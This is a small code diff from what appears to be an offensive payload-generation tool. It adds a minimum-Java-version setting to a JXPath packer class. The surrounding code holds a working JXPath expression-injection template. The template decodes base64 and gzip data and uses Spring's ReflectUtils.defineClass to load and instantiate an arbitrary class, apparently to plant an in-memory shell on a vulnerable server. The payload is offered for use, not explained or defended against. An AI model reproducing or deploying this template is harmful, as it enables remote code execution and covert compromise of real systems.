@@ -7,7 +7,7 @@ import org.leo.jmg.mem.packer.PackerRegistry;
 
 import static org.leo.jmg.mem.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;
 
-@PackerMeta(name = "JXPathSpringGzipJDK17", group = "JXPath", order = 3)
+@PackerMeta(name = "JXPathSpringGzipJDK17", group = "JXPath", order = 3, minTargetJava = 17)
 public class JXPathSpringGzipJDK17Packer implements Packer {
     String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(org.springframework.util.Base64Utils.decodeFromString('{{base64Str}}')))),getContextClassLoader(java.lang.Thread.currentThread()),getProtectionDomain(java.lang.Class.forName('org.springframework.expression.ExpressionParser')),java.lang.Class.forName('org.springframework.expression.ExpressionParser')))";
 
